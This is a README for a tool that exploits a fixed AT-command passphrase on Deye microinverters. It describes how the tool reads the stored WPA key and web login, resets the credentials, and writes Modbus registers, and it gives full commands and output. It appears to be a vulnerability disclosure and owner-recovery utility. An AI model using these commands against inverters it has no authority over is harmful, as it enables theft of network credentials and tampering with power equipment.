# deye-logger-at-cmd

## Credentials lost?
Have you forgotten your credentials and want to reset them? You've come to the right place.

Only use this tool for devices you own!

- Download release from https://github.com/s10l/deye-logger-at-cmd/releases
- Open a terminal window and browse to downloaded file
- Run the command below, but change the ip to the ip of the inverter
(Go) `main -t 192.168.0.20:48899 -xat AT+WEBU=admin,admin` or
(Python) `python3 main.py -t 192.168.0.20:48899 -xat AT+WEBU=admin,admin` 
- Try to login with username: **admin** and password: **admin**
- Voila, but rember to do this only with devices you own!

## Updates
> Update 2023-02-13: Got feedback from users that Deye is now rolling out the update automatically. Please make sure that your device is registered in Solarman or update it manually (offline).

> Update 2023-01-11: Please send a request to Deye to update your inverter firmware at least to 1.53. After the update you where able to change WiFi mode and credentials.

Deye based micro inverters use a built-in WLAN module for quick configuration.

The WLAN module works in AP+STA mode, i.e. it starts an access point and is able to connect to another access point at the same time.

Unfortunately, after configuration, neither the inverter's own access point can be disabled, nor can the default password of `12345678` be changed.

So the hurdle to connect to the inverter's own access point is very low.

In addition to the web based configuration, which can be protected by username and password, it is possible to configure the micro inverter via AT commands on port `48899`. For this purpose, a fixed passphrase `WIFIKIT-214028-READ` is used which in principle cannot be changed since it is already used in iOS and Android apps of the ?manufacturer?.

On the one hand, it is possible to access the inverter, i.e. to enter the operator's own WLAN network.

### TL;DR
This tool reads settings for WLAN (incl. connected SSID and WPA key) as well as web login credentials from the logger.

## Supported Devices

Currently, the deye microinverters are affected by this. Also known under other brands like Bosswerk or Turbo Energy. If your device is also affected, please let me know.

## Dependencies

- Golang is required to build

## Usage

Simply type `main` to print the help

`main`

To read out the settings please type the following

`main -t <ip of the logger>:48899`

If you are interested in what is happening here, you can get the communication output

`main -t <ip of the logger>:48899 -xv`

Example output

```
2022/11/01 10:08:25 * Connecting :0 -> <Inverters IP>:48899...
2022/11/01 10:08:25 > WIFIKIT-214028-READ
2022/11/01 10:08:26 < <Inverters IP>,<Inverters MAC>,<Inverters MID>
2022/11/01 10:08:26 > +ok
2022/11/01 10:08:27 > AT+WAP
2022/11/01 10:08:28 < +ok=11BGN,AP_<Inverters MID>,CH1
2022/11/01 10:08:28 > AT+WAKEY
2022/11/01 10:08:29 < +ok=WPA2PSK,AES,12345678
2022/11/01 10:08:29 > AT+WSSSID
2022/11/01 10:08:30 < +ok=<Your SSID>
2022/11/01 10:08:30 > AT+WSKEY
2022/11/01 10:08:31 < +ok=WPA2PSK,AES,<Your WPA key>
2022/11/01 10:08:31 > AT+WANN
2022/11/01 10:08:32 < +ok=DHCP,<Inverters IP>,<Inverters Sbunet>,<Inverters GW>
2022/11/01 10:08:32 > AT+WEBU
2022/11/01 10:08:33 < +ok=<Your configured username>,<Your configured password>
2022/11/01 10:08:33 > AT+Q
2022/11/01 10:08:34 AP settings
2022/11/01 10:08:34     Mode, SSID and Chanel:  11BGN,AP_AP_<Inverters MID>,CH1
2022/11/01 10:08:34     Encryption:             WPA2PSK,AES,12345678
2022/11/01 10:08:34 Station settings
2022/11/01 10:08:34     SSID:                   <Your SSID>
2022/11/01 10:08:34     Key:                    WPA2PSK,AES,<Your WPA key>
2022/11/01 10:08:34     IP:                     DHCP,<Inverters IP>,<Inverters Sbunet>,<Inverters GW>
2022/11/01 10:08:34 Web settings
2022/11/01 10:08:34     Login:                  <Your configured username>,<Your configured password>
```

### Sending AT-Commands

`main -t <ip of the logger>:48899 -xat <at command>`

Example
```
main -t <ip of the logger>:48899 -xat AT+WEBVER
2022/11/11 12:37:51 * Connecting :0 -> <ip of the logger>:48899...
2022/11/11 12:37:54 +ok=V1.0.24
```

### Sending ModBus read command

`main -t <ip of the logger>:48899 -xmb <Start_Register+Length>`

So with a start register address of 0012 and a length of 0001 only one register is read.

```
main -t <ip of the logger>:48899 -xmb 00120001
2022/11/11 12:39:26 * Connecting :0 -> <ip of the logger>:48899...
2022/11/11 12:39:29 +ok=01030204017B44
```

Explanation
```
01      is the slave id
03      is the function code (read)
02      is the length of the payload (2 bytes)
0401    is the playload, i that case 04 is the number of MPPT and 01 is number of ac phases (you need to know how to interpret the register.)
7B44    is the crc16
```

### Sending ModBus write command

> You may damage or destroy the device or other equipment and seriously injure or kill yourself or others. Be warned herewith.

`main -t <ip of the logger>:48899 -xmbw <Start_Register+Length+Value_Length+Value>`

```
main -t <ip of the logger>:48899 -xmbw 00280001020064
2022/11/11 12:39:26 * Connecting :0 -> <ip of the logger>:48899...
2022/11/11 12:39:29 +ok=01100028000181C1
```

Explanation of -xmbw
```
0028    is the start address            (Active power regulation)
0001    is the number of registers      (1)
02      is the length of the value      (2 bytes)
0064    is the value                    (0x0064 -> 100)
```

## Structure of commands

### Read commands

```
DATAGRAM	:= ATCMD + MODBUSLEN + SEPERATOR + MODBUSMSG + MODBUSCRC + NEWLINE
ATCMD		:= AT+INVDATA=
MODBUSLEN	:= len(MODBUSMSG + MODBUSCRC)
MODBUSCRC	:= crc(MODBUSMSG)
SEPERATOR	:= ,
MODBUSMSG	:= SLAVE + FCODE + STARTADDR + REGSIZE
SLAVE		:= 01
FCODE		:= 03
STARTADDR	:= FFFF
REGSIZE		:= 0001
VALUELEN   	:= len(VALUE)
VALUE		:= 0000
NEWLINE     := \n
```

### Write commands
```
DATAGRAM	:= ATCMD + MODBUSLEN + SEPERATOR + MODBUSMSG + MODBUSCRC + NEWLINE
ATCMD		:= AT+INVDATA=
MODBUSLEN	:= len(MODBUSMSG + MODBUSCRC)
MODBUSCRC	:= crc(MODBUSMSG)
SEPERATOR	:= ,
MODBUSMSG	:= SLAVE + FCODE + STARTADDR + REGSIZE + VALUELEN + VALUE
SLAVE		:= 01
FCODE		:= 10
STARTADDR	:= FFFF
REGSIZE		:= 0001
VALUELEN   	:= len(VALUE)
VALUE		:= 0000
NEWLINE     := \n
```
